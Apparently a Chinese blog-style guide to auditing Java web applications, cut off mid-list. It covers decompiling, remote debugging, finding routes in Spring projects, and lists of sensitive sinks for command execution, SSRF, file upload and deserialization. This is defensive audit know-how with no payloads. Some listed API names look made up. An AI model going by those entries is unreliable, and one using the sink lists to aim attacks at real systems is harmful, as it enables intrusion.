\u6e90\u7801\u6587\u4ef6\u91cc\u4e5f\u6709\u5f88\u591aclass\u6587\u4ef6\uff0c\u5982\u679c\u4e0d\u53cd\u7f16\u8bd1\uff0cidea\u7684\u5168\u5c40\u5b57\u7b26\u641c\u7d22\u5c31\u4e0d\u80fd\u8986\u76d6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5bf9\u6211\u4eec\u7684\u5ba1\u8ba1\u5927\u4e0d\u5229\u3002 \u4e00\u952e\u5bfc\u51fa\u6587\u4ef6\u5939\u4e0b\u6240\u6709jar\u5305 find ./ -name \"*.class\" -exec cp {} targetpath \\; targetpath \u76ee\u6807\u6587\u4ef6\u5939 \u7136\u540e\u7528\u5de5\u5177\u53cd\u7f16\u8bd1\uff0c\u8fd9\u91cc\u63a8\u8350jadx https://github.com/skylot/jadx \u8fdc\u7a0b\u8c03\u8bd5 tomcat: https://blog.csdn.net/xlgen157387/article/details/50268457 // Linxu\u7cfb\u7edf: apach/bin/startup.sh\u5f00\u59cb\u5904\u4e2d\u589e\u52a0\u5982\u4e0b\u5185\u5bb9\uff1a declare -x CATALINA_OPTS=\"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8081\" // Windows\u7cfb\u7edf: apach/bin/startup.bat\u5f00\u59cb\u5904\u4e2d\u589e\u52a0\u5982\u4e0b\u5185\u5bb9\uff1a SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8081 \u5feb\u6377\u952e\u63a8\u8350 ctrl+shift+f \u5168\u5c40\u6587\u4ef6\u5185\u5bb9\u641c\u7d22\uff0c\u4e00\u822c\u7528\u6765\u8ddf\u8e2a\u67d0\u4e2a\u65b9\u6cd5\u7684\u7528\u6cd5 ctrl+shift+o \u5168\u5c40\u641c\u7d22\uff0c\u4e00\u822c\u7528\u6765\u5b9a\u4f4d\u67d0\u4e2a\u7c7b \u4e0a\u624b\u601d\u8def \u5bf9\u4e8espringmvc\u800c\u8a00\uff1a 0.\u628ajsp\u540d\u5168\u90e8\u5bfc\u51fa\u6765\uff0c\u7136\u540e\u653eburp\u91cc\u7206\u7834\uff08\u524d\u53f0\u548c\u540e\u53f0\u90fd\u8bd5\u8bd5\uff09\uff0c\u770b\u54ea\u4e9bjsp\u662f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u7684\uff0c\u5982\u679c\u6709\u80fd\u76f4\u63a5\u8bbf\u95ee\u7684\u5efa\u8bae\u5148\u91cd\u70b9\u5173\u6ce8\u5176\u5185\u5bb9\u3002 find ./ -name \"*.jsp\" -exec cp {} dir \\; 1.\u901a\u8fc7web.xml\u6765\u770b\u6709\u54ea\u4e9b\u8def\u7531\uff0c\u7136\u540e\u6328\u4e2a\u770b\u8def\u7531\u5bf9\u5e94\u7684servlet\u91cc\u7684dopost/doget\u65b9\u6cd5\u903b\u8f91\uff0c\u8bd5\u7740\u627e\u51fa\u6f0f\u6d1e\u70b9\u3002 2.\u6709\u4e9b\u65f6\u5019web.xml\u91cc\u8bb0\u5f55\u7684\u8def\u7531\u4e0d\u5168\uff0c\u9700\u8981\u81ea\u5df1\u624b\u52a8\u53bb\u627e\u3002\u8fd9\u91cc\u53ef\u4ee5\u8bd5\u7740\u5168\u5c40\u641c\u7d22 controller.xml\u6216springmvc.xml/spring-mvc.xml\uff08controller\u7684\u6620\u5c04\u914d\u7f6e\u6587\u4ef6\uff09\uff0c@RequestMapping(. )\uff08\u8def\u7531\u6620\u5c04\u6ce8\u91ca\uff09@Path(. *) (javax.ws.rs.Path\u6ce8\u89e3\uff0c\u4f5c\u7528\u548c@RequestMapping\u5b8c\u5168\u4e00\u6837) 3.\u8def\u7531\u592a\u591a\u4e86\uff0c\u4e00\u4e2a\u4e00\u4e2a\u5206\u6790\u5c31\u5f88\u9ebb\u70e6\u56f0\u96be\u4e86\u3002\u8fd9\u91cc\u63d0\u4f9b\u7684\u601d\u8def\u662f1\u20e3\ufe0f\u4ece\u654f\u611f\u51fd\u6570\u5165\u624b\uff0c\u5411\u4e0a\u67e5\u627e\u5176\u53c2\u6570\u662f\u5426\u7531\u53ef\u63a7\u53c2\u6570\u63a7\u52362\u20e3\ufe0f\u5148\u9ed1\u76d2\uff0c\u770b\u770b\u54ea\u91cc\u6709\u503c\u5f97\u5229\u7528\u7684\u70b9\uff0c\u518d\u770b\u8def\u75313\u20e3\ufe0f\u901a\u8fc7\u8def\u7531\u7c97\u7565\u5224\u65ad\u54ea\u4e9b\u662f\u6bd4\u8f83\u654f\u611f\u7684\uff08file\uff0cupload\uff0csystem\uff0clogin\u7b49\uff09\uff0c\u7136\u540e\u770b\u8def\u7531\u5bf9\u5e94\u903b\u8f91 \u5bf9\u4e8espringboot springboot\u6ca1\u6709\u4e00\u822cweb.xml\uff0c\u6240\u4ee5\u627e\u8def\u7531\u5f97\u9760\u5173\u952e\u5b57@RequestMapping\u6216\u4e0b\u9762\u7684\u5173\u952e\u5b57 @GetMapping @PostMapping @PutMapping @PatchMapping @DeleteMapping \u627econtroller\u9760\u5173\u952e\u5b57@Controller\u6216@RestController \u627efilter \uff1a @WebFilter \u5e38\u89c1\u654f\u611f\u51fd\u6570\u641c\u96c6 rce GroovyShell.evaluate() Runtime.getRuntime().exec() ProcessBuilder().start() \u6216\u8be6\u89c1\u5176\u4ed6\u6587\u7ae0 \u6587\u4ef6\u4e0a\u4f20 ServletFileUpload() \u6587\u4ef6\u4e0a\u4f20\u7684\u6838\u5fc3\u7c7b FileItemStream() \u8bbf\u95ee\u4e0a\u4f20\u6587\u4ef6 MultipartFile() spirng\u91cc\u901a\u8fc7html\u8868\u5355\u63d0\u4ea4\u4e0a\u6765\u7684\u6587\u4ef6\u7edf\u7edf\u4e3aMultipartFile ssrf HttpURLConnection.getInputStream() \u7528\u4e8e\u8bfb\u53d6http\u8bf7\u6c42\u7684\u7ed3\u679c URLConnection.getInputStream() \u540c\u4e0a \u4e0a\u9762\u4e24\u4e2a\u4e5f\u53ef\u4ee5\u7528 url.openconnection() \u6765\u627e\uff0c\u8fd9\u4e2a\u4e1c\u897f\u8fd4\u56deURLConnection\u5bf9\u8c61 URL.openStream() \u548c\u4e0a\u9762\u7684openconnection\u5f88\u50cf\uff0c\u5dee\u4e0d\u591a\u662f\u4e00\u4e2a\u610f\u601d ImageIO.read() \u5f53\u4f20\u5165\u7684\u662furl\u65f6\uff0c\u4f1a\u5728\u65b9\u6cd5\u5185\u90e8\u8c03\u7528url.openstream HttpClents.execute() HttpClent.execute() \u53cd\u5e8f\u5217\u5316 readObject .fromXML( xstream\u53cd\u5e8f\u5217\u5316 \u6587\u4ef6\u8bfb\u53d6 new Scanner( Files.lines Files.readAllLines Files.readString( Files.readAllBytes new BufferedReader \u6587\u4ef6\u7c7b File \uff1a\u2f64\u4e8e\u8868\u793a\u2f42\u4ef6\u548c\u2f6c\u5f55\u3002 RandomAccessFile \uff1a\u2f64\u4e8e\u8bfb\u53d6\u548c\u5199\u2f0a\u2f42\u4ef6\u3002 FileInputStream \uff1a\u2f64\u4e8e\u8bfb\u53d6\u2f42\u4ef6\u7684\u539f\u59cb\u5b57\u8282\u6d41\u3002 FileOutputStream \uff1a\u2f64\u4e8e\u5199\u2f0a\u2f42\u4ef6\u7684\u539f\u59cb\u5b57\u8282\u6d41\u3002 FileReader \uff1a\u2f64\u4e8e\u8bfb\u53d6\u2f42\u4ef6\u7684\u5b57\u7b26\u6d41\u3002 FileWriter \uff1a\u2f64\u4e8e\u5199\u2f0a\u2f42\u4ef6\u7684\u5b57\u7b26\u6d41\u3002 BufferedReader \uff1a\u2f64\u4e8e\u8bfb\u53d6\u2f42\u4ef6\u7684\u7f13\u51b2\u5b57\u7b26\u6d41\u3002 BufferedWriter \uff1a\u2f64\u4e8e\u5199\u2f0a\u2f42\u4ef6\u7684\u7f13\u51b2\u5b57\u7b26\u6d41\u3002 Scanner \uff1a\u2f64\u4e8e\u4ece\u2f42\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u3002 File.createTempFile() \uff1a\u2f64\u4e8e\u521b\u5efa\u4e34\u65f6\u2f42\u4ef6\u3002 File.createNewFile() \uff1a\u2f64\u4e8e\u521b\u5efa\u65b0\u2f42\u4ef6\u3002 File.mkdir() \uff1a\u2f64\u4e8e\u521b\u5efa\u2f6c\u5f55\u3002 File.mkdirs() \uff1a\u2f64\u4e8e\u521b\u5efa\u2f6c\u5f55\u6811\u3002 File.delete() \uff1a\u2f64\u4e8e\u5220\u9664\u2f42\u4ef6\u3002 File.listFiles() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f6c\u5f55\u4e0b\u7684\u2f42\u4ef6\u5217\u8868\u3002 File.setExecutable() \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u2f42\u4ef6\u7684\u53ef\u6267\u2f8f File.canRead() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u53ef\u8bfb\u3002 File.canWrite() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u53ef\u5199\u3002 File.canExecute() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u53ef\u6267\u2f8f\u3002 File.isDirectory() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u662f\u2f6c\u5f55\u3002 File.isFile() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u662f\u666e\u901a\u2f42\u4ef6\u3002 File.isHidden() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u662f\u9690\u85cf\u2f42\u4ef6\u3002 File.isAbsolute() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u8def\u5f84\u662f\u5426\u662f\u7edd\u5bf9\u8def\u5f84\u3002 File.length() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u2f24\u2f29\u3002 File.listRoots() \uff1a\u2f64\u4e8e\u83b7\u53d6\u7cfb\u7edf\u4e2d\u53ef\u2f64\u7684\u2f42\u4ef6\u7cfb\u7edf\u6839\u2f6c\u5f55\u3002 File.getAbsolutePath() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u3002 File.getCanonicalPath() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u89c4\u8303\u8def\u5f84\u3002 File.getParent() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u2f57\u2f6c\u5f55\u3002 File.getName() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u540d\u79f0\u3002 File.getPath() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u8def\u5f84\u3002 File.lastModified() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u3002 File.setLastModified() \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u2f42\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u3002 File.renameTo() \uff1a\u2f64\u4e8e\u91cd\u547d\u540d\u2f42\u4ef6\u3002 File.getFreeSpace() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7cfb\u7edf\u4e2d\u7a7a\u95f2\u7684\u78c1\u76d8\u7a7a\u95f4\u3002 File.getTotalSpace() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7cfb\u7edf\u4e2d\u603b\u7684\u78c1\u76d8\u7a7a\u95f4\u3002 File.getUsableSpace() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7cfb\u7edf\u4e2d\u53ef\u2f64\u7684\u78c1\u76d8\u7a7a\u95f4\u3002 \u6d89\u53ca\u2f79\u7edc\u8bbf\u95ee\u7684\u654f\u611f\u51fd\u6570\uff0c\u5305\u62ec\uff1a URL \uff1a\u2f64\u4e8e\u521b\u5efa\u2f00\u4e2a\u8868\u793a\u2f79\u7edc\u8d44\u6e90\u7684 URL \u3002 URLConnection \uff1a\u62bd\u8c61\u7c7b\uff0c\u8868\u793a\u5e94\u2f64\u7a0b\u5e8f\u4e0e URL \u4e4b\u95f4\u7684\u901a\u4fe1\u94fe\u63a5\u3002 HttpURLConnection \uff1a\u2f64\u4e8e\u6253\u5f00\u4e0e HTTP \u670d\u52a1\u5668\u7684\u901a\u4fe1\u94fe\u63a5\u3002 HttpClient \uff1a\u2f64\u4e8e\u6267\u2f8f HTTP \u8bf7\u6c42\u7684\u5ba2\u6237\u7aef\u3002 InetAddress \uff1a\u2f64\u4e8e\u6807\u8bc6\u2f79\u7edc\u4e0a\u7684\u786c\u4ef6\u8d44\u6e90\u3002 ServerSocket \uff1a\u2f64\u4e8e\u7b49\u5f85\u6765\u2f83\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\u3002 Socket \uff1a\u2f64\u4e8e\u901a\u8fc7\u2f79\u7edc\u8fdb\u2f8f\u901a\u4fe1\u7684\u5ba2\u6237\u7aef\u6216\u670d\u52a1\u5668\u3002 HttpServlet \uff1a\u2f64\u4e8e\u63d0\u4f9b\u57fa\u4e8e HTTP \u7684\u670d\u52a1\u7684\u62bd\u8c61\u7c7b\u3002 ServletRequest \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u8bf7\u6c42\u7684\u63a5\u2f1d\u3002 ServletResponse \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u54cd\u5e94\u7684\u63a5\u2f1d\u3002 HttpSession \uff1a\u2f64\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4fdd\u5b58\u4f1a\u8bdd\u4fe1\u606f\u7684\u63a5\u2f1d\u3002 Cookie \uff1a\u2f64\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4fdd\u5b58\u4fe1\u606f\u7684\u7c7b\u3002 SessionCookieConfig \uff1a\u2f64\u4e8e\u914d\u7f6e\u4f1a\u8bdd Cookie \u7684\u63a5\u2f1d\u3002 HttpServletRequest \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u8bf7\u6c42\u7684\u63a5\u2f1d\u3002 HttpServletResponse \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u54cd\u5e94\u7684\u63a5\u2f1d\u3002 HttpSessionBindingListener \uff1a\u2f64\u4e8e\u76d1\u542c\u5bf9\u8c61\u7ed1\u5b9a\u548c\u89e3\u9664\u7ed1\u5b9a\u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 HttpSessionActivationListener \uff1a\u2f64\u4e8e\u76d1\u542c\u4f1a\u8bdd\u6d3b\u52a8\u548c\u949d\u5316\u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 HttpSessionAttributeListener \uff1a\u2f64\u4e8e\u76d1\u542c\u4f1a\u8bdd\u5c5e\u6027\u7684\u53d8\u5316\u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 HttpSessionBindingEvent \uff1a\u8868\u793a\u4f1a\u8bdd\u7ed1\u5b9a\u548c\u89e3\u9664\u7ed1\u5b9a\u4e8b\u4ef6\u7684\u7c7b\u3002 \u6d89\u53ca\u6570\u636e\u5e93\u7684\u51fd\u6570\u5305\u62ec\uff1a DriverManager \uff1a\u2f64\u4e8e\u7ba1\u7406 JDBC \u9a71\u52a8\u7a0b\u5e8f\u7684\u7c7b\u3002 Connection \uff1a\u8868\u793a\u6570\u636e\u5e93\u8fde\u63a5\u7684\u63a5\u2f1d\u3002 Statement \uff1a\u2f64\u4e8e\u6267\u2f8f SQL \u8bed\u53e5\u7684\u63a5\u2f1d\u3002 PreparedStatement \uff1a\u2f64\u4e8e\u6267\u2f8f\u9884\u7f16\u8bd1\u7684 SQL \u8bed\u53e5\u7684\u63a5\u2f1d\u3002 CallableStatement \uff1a\u2f64\u4e8e\u6267\u2f8f\u5b58\u50a8\u8fc7\u7a0b\u7684\u63a5\u2f1d\u3002 ResultSet \uff1a\u2f64\u4e8e\u4fdd\u5b58\u6570\u636e\u5e93\u67e5\u8be2\u7ed3\u679c\u7684\u63a5\u2f1d\u3002 DataSource \uff1a\u63a5\u2f1d\uff0c\u8868\u793a\u63d0\u4f9b\u8fde\u63a5\u7684\u6570\u636e\u6e90\u3002 ConnectionPoolDataSource \uff1a\u63a5\u2f1d\uff0c\u8868\u793a\u63d0\u4f9b\u8fde\u63a5\u6c60\u7684\u6570\u636e\u6e90\u3002 PooledConnection \uff1a\u8868\u793a\u4ece\u8fde\u63a5\u6c60\u4e2d\u83b7\u53d6\u7684\u8fde\u63a5\u7684\u63a5\u2f1d\u3002 RowSet \uff1a\u2f64\u4e8e\u5b58\u50a8\u7ed3\u679c\u96c6\u7684\u63a5\u2f1d\u3002 RowSetFactory \uff1a\u2f64\u4e8e\u521b\u5efa RowSet \u5bf9\u8c61\u7684\u2f2f\u2f1a\u7c7b\u3002 RowSetProvider \uff1a\u2f64\u4e8e\u521b\u5efa RowSetFactory \u5bf9\u8c61\u7684\u2f2f\u2f1a\u7c7b\u3002 RowSetMetaData \uff1a\u2f64\u4e8e\u63cf\u8ff0 RowSet \u5bf9\u8c61\u7ed3\u6784\u7684\u63a5\u2f1d\u3002 RowSetEvent \uff1a\u8868\u793a RowSet \u4e8b\u4ef6\u7684\u7c7b\u3002 RowSetListener \uff1a\u2f64\u4e8e\u76d1\u542c RowSet \u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 \u6d89\u53ca\u8fd0\u2f8f\u547d\u4ee4\u7684\u654f\u611f\u51fd\u6570\uff1a Runtime \uff1a\u2f64\u4e8e\u6267\u2f8f\u5916\u90e8\u7a0b\u5e8f\u7684\u7c7b\u3002 Process \uff1a\u8868\u793a\u5916\u90e8\u7a0b\u5e8f\u7684\u63a5\u2f1d\u3002 ProcessBuilder \uff1a\u2f64\u4e8e\u521b\u5efa\u8fdb\u7a0b\u7684\u7c7b\u3002 ProcessClass \uff1a\u2f64\u4e8e\u63cf\u8ff0\u8fdb\u7a0b\u7684\u7c7b\u3002 ProcessHandle \uff1a\u2f64\u4e8e\u83b7\u53d6\u8fdb\u7a0b\u4fe1\u606f\u7684\u63a5\u2f1d\u3002 ProcessHandle.Info \uff1a\u2f64\u4e8e\u83b7\u53d6\u8fdb\u7a0b\u4fe1\u606f\u7684\u7c7b\u3002 ProcessBuilder.Redirect \uff1a\u2f64\u4e8e\u91cd\u5b9a\u5411\u8fdb\u7a0b\u8f93\u2f0a/\u8f93\u51fa\u7684\u7c7b\u3002 ProcessBuilder.Redirect.Type \uff1a\u8868\u793a\u91cd\u5b9a\u5411\u7c7b\u578b\u7684\u679a\u4e3e\u7c7b\u3002 ProcessHandle.Redirect \uff1a\u2f64\u4e8e\u91cd\u5b9a\u5411\u8fdb\u7a0b\u8f93\u2f0a/\u8f93\u51fa\u7684\u63a5\u2f1d\u3002 ProcessHandle.Redirect.Type \uff1a\u8868\u793a\u91cd\u5b9a\u5411\u7c7b\u578b\u7684\u679a\u4e3e\u7c7b Java\u6e90\u7801\u5ba1\u8ba1\u6d89\u53ca\u5e8f\u5217\u5316\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u5305\u62ec\uff1a ObjectInputStream.readObject \uff1a\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectInputStream.readUnshared \uff1a\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u672a\u5171\u4eab\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectInputStream.defaultReadObject \uff1a\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u9ed8\u8ba4\u5e8f\u5217\u5316\u5b57\u6bb5\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.writeObject \uff1a\u2f64\u4e8e\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.writeUnshared \uff1a\u2f64\u4e8e\u5e8f\u5217\u5316\u672a\u5171\u4eab\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.defaultWriteObject \uff1a\u2f64\u4e8e\u5e8f\u5217\u5316\u9ed8\u8ba4\u5e8f\u5217\u5316\u5b57\u6bb5\u7684\u2f45\u6cd5\u3002 ObjectInputStream.resolveClass \uff1a\u2f64\u4e8e\u89e3\u6790\u7c7b\u540d\u79f0\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.annotateClass \uff1a\u2f64\u4e8e\u6ce8\u89e3\u7c7b\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.annotateProxyClass \uff1a\u2f64\u4e8e\u6ce8\u89e3\u4ee3\u7406\u7c7b\u7684\u2f45\u6cd5\u3002 \u6d89\u53ca\u53cd\u5c04\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u5305\u62ec\uff1a Class.forName \uff1a\u2f64\u4e8e\u52a0\u8f7d\u7c7b\u7684\u9759\u6001\u2f45\u6cd5\u3002 Class.newInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u5b9e\u4f8b\u7684\u2f45\u6cd5\u3002 Class.getMethod \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Class.getConstructor \uff1a\u2f64\u4e8e\u83b7\u53d6\u6784\u9020\u51fd\u6570\u7684\u2f45\u6cd5\u3002 Constructor.newInstance \uff1a\u2f64\u4e8e\u8c03\u2f64\u6784\u9020\u51fd\u6570\u7684\u2f45\u6cd5\u3002 Method.invoke \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 ClassLoader.loadClass \uff1a\u2f64\u4e8e\u52a0\u8f7d\u7c7b\u7684\u2f45\u6cd5\u3002 Method.setAccessible \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650\u7684\u2f45\u6cd5\u3002 Field.setAccessible \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650\u7684\u2f45\u6cd5\u3002 Class.getDeclaredFields \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u7684\u6240\u6709\u5b57\u6bb5\u7684\u2f45\u6cd5\u3002 Class.getDeclaredMethods \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u7684\u6240\u6709\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Class.getDeclaredConstructors \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u7684\u6240\u6709\u6784\u9020\u51fd\u6570\u7684\u2f45\u6cd5\u3002 Class.getInterfaces \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u5b9e\u73b0\u7684\u63a5\u2f1d\u7684\u2f45\u6cd5\u3002 Field.get \uff1a\u2f64\u4e8e\u83b7\u53d6\u5b57\u6bb5\u503c\u7684\u2f45\u6cd5\u3002 Field.set \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u5b57\u6bb5\u503c\u7684\u2f45\u6cd5\u3002 MethodHandles.lookup \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u53e5\u67c4\u7684\u2f45\u6cd5\u3002 MethodHandle.invoke \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 MethodHandle.invokeExact \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\uff0c\u5305\u62ec\u53c2\u6570\u7c7b\u578b\u548c\u8fd4\u56de\u503c\u7c7b\u578b\u3002 Constructor.setAccessible \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u6784\u9020\u51fd\u6570\u7684\u8bbf\u95ee\u6743\u9650\u7684\u2f45\u6cd5\u3002 Method.getModifiers \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u7684\u4fee\u9970\u7b26\u7684\u2f45\u6cd5\u3002 Field.getModifiers \uff1a\u2f64\u4e8e\u83b7\u53d6\u5b57\u6bb5\u7684\u4fee\u9970\u7b26\u7684\u2f45\u6cd5\u3002 Modifier.isPublic \uff1a\u2f64\u4e8e\u5224\u65ad\u4fee\u9970\u7b26\u662f\u5426\u4e3a public \u7684\u9759\u6001\u2f45\u6cd5\u3002 Modifier.isProtected \uff1a\u2f64\u4e8e\u5224\u65ad\u4fee\u9970\u7b26\u662f\u5426\u4e3a protected \u7684\u9759\u6001\u2f45\u6cd5\u3002 Modifier.isPrivate \uff1a\u2f64\u4e8e\u5224\u65ad\u4fee\u9970\u7b26\u662f\u5426\u4e3a private \u7684\u9759\u6001\u2f45\u6cd5\u3002 Constructor.newInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\u7684\u2f45\u6cd5\u3002 Proxy.newProxyInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u52a8\u6001\u4ee3\u7406\u7c7b\u7684\u2f45\u6cd5 \u6d89\u53ca\u52a8\u6001\u4ee3\u7406\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u4e3b\u8981\u6709\uff1a Proxy.newProxyInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u52a8\u6001\u4ee3\u7406\u7c7b\u7684\u2f45\u6cd5\u3002 InvocationHandler.invoke \uff1a\u2f64\u4e8e\u5b9e\u73b0\u52a8\u6001\u4ee3\u7406\u7684\u2f45\u6cd5\u3002 Class.getClasses \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u516c\u5171\u5185\u90e8\u7c7b\u7684\u2f45\u6cd5\u3002 Class.getDeclaredClasses \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u58f0\u660e\u7684\u5185\u90e8\u7c7b\u7684\u2f45\u6cd5\u3002 Class.getDeclaredMethods \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u58f0\u660e\u7684\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Class.getMethod \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6307\u5b9a\u7684\u516c\u5171\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Method.getDeclaringClass \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u6240\u5c5e\u7c7b\u7684\u2f45\u6cd5\u3002 Method.getName \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u540d\u79f0\u7684\u2f45\u6cd5\u3002 Method.getParameterTypes \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u53c2\u6570\u7c7b\u578b\u7684\u2f45\u6cd5\u3002 Method.getReturnType \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u8fd4\u56de\u503c\u7c7b\u578b\u7684\u2f45\u6cd5\u3002 Method.invoke \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 \u6d89\u53ca\u7ebf\u7a0b\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a Thread.start \uff1a\u2f64\u4e8e\u542f\u52a8\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.stop \uff1a\u2f64\u4e8e\u505c\u2f4c\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.suspend \uff1a\u2f64\u4e8e\u6302\u8d77\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.resume \uff1a\u2f64\u4e8e\u6062\u590d\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.setDaemon \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u7ebf\u7a0b\u662f\u5426\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.setName \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u7ebf\u7a0b\u540d\u79f0\u7684\u2f45\u6cd5\u3002 Thread.setPriority \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u7ebf\u7a0b\u4f18\u5148\u7ea7\u7684\u2f45\u6cd5\u3002 Thread.join \uff1a\u2f64\u4e8e\u7b49\u5f85\u7ebf\u7a0b\u7ed3\u675f\u7684\u2f45\u6cd5\u3002 Thread.interrupt \uff1a\u2f64\u4e8e\u4e2d\u65ad\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 \u6d89\u53ca\u7cfb\u7edf\u5c5e\u6027\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a System.getProperties \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.getProperty \uff1a\u2f64\u4e8e\u83b7\u53d6\u6307\u5b9a\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.setProperties \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u5f53\u524d\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.setProperty \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u6307\u5b9a\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.clearProperty \uff1a\u2f64\u4e8e\u6e05\u9664\u6307\u5b9a\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.getenv 